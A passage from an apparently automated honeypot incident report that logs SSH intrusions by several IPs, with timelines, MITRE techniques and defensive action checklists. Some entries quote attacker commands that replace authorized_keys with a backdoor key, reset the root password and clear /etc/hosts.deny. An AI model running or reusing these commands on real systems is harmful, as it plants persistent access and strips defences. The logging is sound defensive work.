| `2026-04-13 06:40:30` | `cowrie.command.failed` |
| `2026-04-13 06:40:30` | `cowrie.log.closed` |
| `2026-04-13 06:40:31` | `cowrie.session.params` |
| `2026-04-13 06:40:31` | `cowrie.command.input` |
| `2026-04-13 06:40:31` | `cowrie.session.file_download` |
| `2026-04-13 06:40:31` | `cowrie.log.closed` |
| `2026-04-13 06:40:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.216.108[.]62` to AbuseIPDB if not already reported
- [ ] Block `112.216.108[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-def3be7692fc

| Field | Detail |
|---|---|
| **Source IP** | `112.216.108[.]62` |
| **First Seen** | 2026-04-13 06:40 |
| **Last Seen** | 2026-04-13 06:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:40:33` | `cowrie.session.connect` |
| `2026-04-13 06:40:33` | `cowrie.client.version` |
| `2026-04-13 06:40:33` | `cowrie.client.kex` |
| `2026-04-13 06:40:34` | `cowrie.login.success` |
| `2026-04-13 06:40:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.216.108[.]62` to AbuseIPDB if not already reported
- [ ] Block `112.216.108[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db0a0bfbaeb3

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-13 06:41 |
| **Last Seen** | 2026-04-13 06:41 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:41:20` | `cowrie.session.connect` |
| `2026-04-13 06:41:20` | `cowrie.client.version` |
| `2026-04-13 06:41:20` | `cowrie.client.kex` |
| `2026-04-13 06:41:21` | `cowrie.login.success` |
| `2026-04-13 06:41:22` | `cowrie.session.params` |
| `2026-04-13 06:41:22` | `cowrie.command.input` |
| `2026-04-13 06:41:22` | `cowrie.command.failed` |
| `2026-04-13 06:41:22` | `cowrie.log.closed` |
| `2026-04-13 06:41:23` | `cowrie.session.params` |
| `2026-04-13 06:41:23` | `cowrie.command.input` |
| `2026-04-13 06:41:23` | `cowrie.session.file_download` |
| `2026-04-13 06:41:23` | `cowrie.log.closed` |
| `2026-04-13 06:41:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ab6d1409df9

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-13 06:41 |
| **Last Seen** | 2026-04-13 06:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:41:27` | `cowrie.session.connect` |
| `2026-04-13 06:41:27` | `cowrie.client.version` |
| `2026-04-13 06:41:27` | `cowrie.client.kex` |
| `2026-04-13 06:41:28` | `cowrie.login.success` |
| `2026-04-13 06:41:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49defe01ee48

| Field | Detail |
|---|---|
| **Source IP** | `112.216.108[.]62` |
| **First Seen** | 2026-04-13 06:42 |
| **Last Seen** | 2026-04-13 06:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:42:11` | `cowrie.session.connect` |
| `2026-04-13 06:42:11` | `cowrie.client.version` |
| `2026-04-13 06:42:11` | `cowrie.client.kex` |
| `2026-04-13 06:42:11` | `cowrie.login.success` |
| `2026-04-13 06:42:12` | `cowrie.session.params` |
| `2026-04-13 06:42:12` | `cowrie.command.input` |
| `2026-04-13 06:42:12` | `cowrie.command.failed` |
| `2026-04-13 06:42:12` | `cowrie.log.closed` |
| `2026-04-13 06:42:12` | `cowrie.session.params` |
| `2026-04-13 06:42:12` | `cowrie.command.input` |
| `2026-04-13 06:42:12` | `cowrie.session.file_download` |
| `2026-04-13 06:42:12` | `cowrie.log.closed` |
| `2026-04-13 06:42:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.216.108[.]62` to AbuseIPDB if not already reported
- [ ] Block `112.216.108[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-997ccea7d197

| Field | Detail |
|---|---|
| **Source IP** | `112.216.108[.]62` |
| **First Seen** | 2026-04-13 06:42 |
| **Last Seen** | 2026-04-13 06:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:42:14` | `cowrie.session.connect` |
| `2026-04-13 06:42:14` | `cowrie.client.version` |
| `2026-04-13 06:42:14` | `cowrie.client.kex` |
| `2026-04-13 06:42:15` | `cowrie.login.success` |
| `2026-04-13 06:42:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.216.108[.]62` to AbuseIPDB if not already reported
- [ ] Block `112.216.108[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-969c21853283

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-13 06:43 |
| **Last Seen** | 2026-04-13 06:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:43:13` | `cowrie.session.connect` |
| `2026-04-13 06:43:13` | `cowrie.client.version` |
| `2026-04-13 06:43:14` | `cowrie.client.kex` |
| `2026-04-13 06:43:15` | `cowrie.login.success` |
| `2026-04-13 06:43:15` | `cowrie.session.params` |
| `2026-04-13 06:43:15` | `cowrie.command.input` |
| `2026-04-13 06:43:15` | `cowrie.command.failed` |
| `2026-04-13 06:43:16` | `cowrie.log.closed` |
| `2026-04-13 06:43:16` | `cowrie.session.params` |
| `2026-04-13 06:43:16` | `cowrie.command.input` |
| `2026-04-13 06:43:17` | `cowrie.session.file_download` |
| `2026-04-13 06:43:17` | `cowrie.log.closed` |
| `2026-04-13 06:43:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08f324f3fda0

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-13 06:43 |
| **Last Seen** | 2026-04-13 06:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:43:20` | `cowrie.session.connect` |
| `2026-04-13 06:43:20` | `cowrie.client.version` |
| `2026-04-13 06:43:20` | `cowrie.client.kex` |
| `2026-04-13 06:43:22` | `cowrie.login.success` |
| `2026-04-13 06:43:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ffc66a5303e

| Field | Detail |
|---|---|
| **Source IP** | `177.70.6[.]158` |
| **First Seen** | 2026-04-13 06:46 |
| **Last Seen** | 2026-04-13 06:46 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:46:22` | `cowrie.session.connect` |
| `2026-04-13 06:46:22` | `cowrie.client.version` |
| `2026-04-13 06:46:23` | `cowrie.client.kex` |
| `2026-04-13 06:46:24` | `cowrie.login.success` |
| `2026-04-13 06:46:25` | `cowrie.session.params` |
| `2026-04-13 06:46:25` | `cowrie.command.input` |
| `2026-04-13 06:46:25` | `cowrie.command.failed` |
| `2026-04-13 06:46:25` | `cowrie.log.closed` |
| `2026-04-13 06:46:26` | `cowrie.session.params` |
| `2026-04-13 06:46:26` | `cowrie.command.input` |
| `2026-04-13 06:46:26` | `cowrie.session.file_download` |
| `2026-04-13 06:46:26` | `cowrie.log.closed` |
| `2026-04-13 06:46:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.6[.]158` to AbuseIPDB if not already reported
- [ ] Block `177.70.6[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12aef3bb2886

| Field | Detail |
|---|---|
| **Source IP** | `177.70.6[.]158` |
| **First Seen** | 2026-04-13 06:46 |
| **Last Seen** | 2026-04-13 06:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:46:30` | `cowrie.session.connect` |
| `2026-04-13 06:46:30` | `cowrie.client.version` |
| `2026-04-13 06:46:30` | `cowrie.client.kex` |
| `2026-04-13 06:46:31` | `cowrie.login.success` |
| `2026-04-13 06:46:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.70.6[.]158` to AbuseIPDB if not already reported
- [ ] Block `177.70.6[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11854eec9cfc

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-13 06:46 |
| **Last Seen** | 2026-04-13 06:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:46:56` | `cowrie.session.connect` |
| `2026-04-13 06:46:56` | `cowrie.client.version` |
| `2026-04-13 06:46:56` | `cowrie.client.kex` |
| `2026-04-13 06:46:57` | `cowrie.login.success` |
| `2026-04-13 06:46:58` | `cowrie.session.params` |
| `2026-04-13 06:46:58` | `cowrie.command.input` |
| `2026-04-13 06:46:58` | `cowrie.command.failed` |
| `2026-04-13 06:46:58` | `cowrie.log.closed` |
| `2026-04-13 06:46:59` | `cowrie.session.params` |
| `2026-04-13 06:46:59` | `cowrie.command.input` |
| `2026-04-13 06:46:59` | `cowrie.session.file_download` |
| `2026-04-13 06:46:59` | `cowrie.log.closed` |
| `2026-04-13 06:47:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8619a7532b75

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-13 06:47 |
| **Last Seen** | 2026-04-13 06:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:47:03` | `cowrie.session.connect` |
| `2026-04-13 06:47:03` | `cowrie.client.version` |
| `2026-04-13 06:47:03` | `cowrie.client.kex` |
| `2026-04-13 06:47:04` | `cowrie.login.success` |
| `2026-04-13 06:47:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6d7e8139e36

| Field | Detail |
|---|---|
| **Source IP** | `180.184.38[.]93` |
| **First Seen** | 2026-04-13 07:30 |
| **Last Seen** | 2026-04-13 07:30 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:4RkIjOZdxOIv"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 07:30:17` | `cowrie.session.connect` |
| `2026-04-13 07:30:17` | `cowrie.client.version` |
| `2026-04-13 07:30:17` | `cowrie.client.kex` |
| `2026-04-13 07:30:18` | `cowrie.login.success` |
| `2026-04-13 07:30:18` | `cowrie.session.params` |
| `2026-04-13 07:30:18` | `cowrie.command.input` |
| `2026-04-13 07:30:18` | `cowrie.command.failed` |
| `2026-04-13 07:30:18` | `cowrie.log.closed` |
| `2026-04-13 07:30:19` | `cowrie.session.params` |
| `2026-04-13 07:30:19` | `cowrie.command.input` |
| `2026-04-13 07:30:19` | `cowrie.session.file_download` |
| `2026-04-13 07:30:19` | `cowrie.log.closed` |
| `2026-04-13 07:30:35` | `cowrie.session.params` |
| `2026-04-13 07:30:35` | `cowrie.command.input` |
| `2026-04-13 07:30:35` | `cowrie.log.closed` |
| `2026-04-13 07:30:36` | `cowrie.session.params` |
| `2026-04-13 07:30:36` | `cowrie.command.input` |
| `2026-04-13 07:30:36` | `cowrie.log.closed` |
| `2026-04-13 07:30:37` | `cowrie.session.params` |
| `2026-04-13 07:30:37` | `cowrie.command.input` |
| `2026-04-13 07:30:38` | `cowrie.session.file_download` |
| `2026-04-13 07:30:38` | `cowrie.log.closed` |
| `2026-04-13 07:30:38` | `cowrie.session.params` |
| `2026-04-13 07:30:38` | `cowrie.command.input` |
| `2026-04-13 07:30:38` | `cowrie.log.closed` |
| `2026-04-13 07:30:38` | `cowrie.session.params` |
| `2026-04-13 07:30:38` | `cowrie.command.input` |
| `2026-04-13 07:30:39` | `cowrie.log.closed` |
| `2026-04-13 07:30:39` | `cowrie.session.params` |
| `2026-04-13 07:30:39` | `cowrie.command.input` |
| `2026-04-13 07:30:39` | `cowrie.command.input` |
| `2026-04-13 07:30:39` | `cowrie.log.closed` |
| `2026-04-13 07:30:40` | `cowrie.session.params` |
| `2026-04-13 07:30:40` | `cowrie.command.input` |
| `2026-04-13 07:30:40` | `cowrie.log.closed` |
| `2026-04-13 07:30:41` | `cowrie.session.params` |
| `2026-04-13 07:30:41` | `cowrie.command.input` |
| `2026-04-13 07:30:41` | `cowrie.log.closed` |
| `2026-04-13 07:30:41` | `cowrie.session.params` |
| `2026-04-13 07:30:41` | `cowrie.command.input` |
| `2026-04-13 07:30:42` | `cowrie.log.closed` |
| `2026-04-13 07:30:43` | `cowrie.session.params` |
| `2026-04-13 07:30:43` | `cowrie.command.input` |
| `2026-04-13 07:30:43` | `cowrie.log.closed` |
| `2026-04-13 07:30:43` | `cowrie.session.params` |
| `2026-04-13 07:30:43` | `cowrie.command.input` |
| `2026-04-13 07:30:43` | `cowrie.log.closed` |
| `2026-04-13 07:30:44` | `cowrie.session.params` |
| `2026-04-13 07:30:44` | `cowrie.command.input` |
| `2026-04-13 07:30:44` | `cowrie.log.closed` |
| `2026-04-13 07:30:45` | `cowrie.session.params` |
| `2026-04-13 07:30:45` | `cowrie.command.input` |
| `2026-04-13 07:30:45` | `cowrie.log.closed` |
| `2026-04-13 07:30:45` | `cowrie.session.params` |
| `2026-04-13 07:30:45` | `cowrie.command.input` |
| `2026-04-13 07:30:45` | `cowrie.log.closed` |
| `2026-04-13 07:30:46` | `cowrie.session.params` |
| `2026-04-13 07:30:46` | `cowrie.command.input` |
| `2026-04-13 07:30:46` | `cowrie.log.closed` |
| `2026-04-13 07:30:47` | `cowrie.session.params` |
| `2026-04-13 07:30:47` | `cowrie.command.input` |
| `2026-04-13 07:30:47` | `cowrie.log.closed` |
| `2026-04-13 07:30:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.38[.]93` to AbuseIPDB if not already reported
- [ ] Block `180.184.38[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-999f775df69b

| Field | Detail |
|---|---|
| **Source IP** | `180.76.98[.]88` |
| **First Seen** | 2026-04-13 07:37 |
| **Last Seen** | 2026-04-13 07:38 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;, cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 07:37:40` | `cowrie.session.connect` |
| `2026-04-13 07:37:40` | `cowrie.client.version` |
| `2026-04-13 07:37:41` | `cowrie.client.kex` |
| `2026-04-13 07:37:42` | `cowrie.login.success` |
| `2026-04-13 07:37:44` | `cowrie.session.params` |
| `2026-04-13 07:37:44` | `cowrie.command.input` |
| `2026-04-13 07:37:44` | `cowrie.command.failed` |
| `2026-04-13 07:37:44` | `cowrie.log.closed` |
| `2026-04-13 07:37:45` | `cowrie.session.params` |
| `2026-04-13 07:37:45` | `cowrie.command.input` |
| `2026-04-13 07:37:45` | `cowrie.session.file_download` |
| `2026-04-13 07:37:45` | `cowrie.log.closed` |
| `2026-04-13 07:37:59` | `cowrie.session.params` |
| `2026-04-13 07:37:59` | `cowrie.command.input` |
| `2026-04-13 07:37:59` | `cowrie.log.closed` |
| `2026-04-13 07:38:07` | `cowrie.session.params` |
| `2026-04-13 07:38:07` | `cowrie.command.input` |
| `2026-04-13 07:38:08` | `cowrie.session.file_download` |
| `2026-04-13 07:38:08` | `cowrie.log.closed` |
| `2026-04-13 07:38:10` | `cowrie.session.params` |
| `2026-04-13 07:38:10` | `cowrie.command.input` |
| `2026-04-13 07:38:10` | `cowrie.log.closed` |
| `2026-04-13 07:38:11` | `cowrie.session.params` |
| `2026-04-13 07:38:11` | `cowrie.command.input` |
| `2026-04-13 07:38:11` | `cowrie.log.closed` |
| `2026-04-13 07:38:12` | `cowrie.session.params` |
| `2026-04-13 07:38:12` | `cowrie.command.input` |
| `2026-04-13 07:38:12` | `cowrie.command.input` |
| `2026-04-13 07:38:12` | `cowrie.log.closed` |
| `2026-04-13 07:38:13` | `cowrie.session.params` |
| `2026-04-13 07:38:13` | `cowrie.command.input` |
| `2026-04-13 07:38:13` | `cowrie.log.closed` |
| `2026-04-13 07:38:15` | `cowrie.session.params` |
| `2026-04-13 07:38:15` | `cowrie.command.input` |
| `2026-04-13 07:38:18` | `cowrie.log.closed` |
| `2026-04-13 07:38:18` | `cowrie.session.params` |
| `2026-04-13 07:38:18` | `cowrie.command.input` |
| `2026-04-13 07:38:19` | `cowrie.log.closed` |
| `2026-04-13 07:38:20` | `cowrie.session.params` |
| `2026-04-13 07:38:20` | `cowrie.command.input` |
| `2026-04-13 07:38:20` | `cowrie.log.closed` |
| `2026-04-13 07:38:21` | `cowrie.session.params` |
| `2026-04-13 07:38:21` | `cowrie.command.input` |
| `2026-04-13 07:38:21` | `cowrie.log.closed` |
| `2026-04-13 07:38:23` | `cowrie.session.params` |
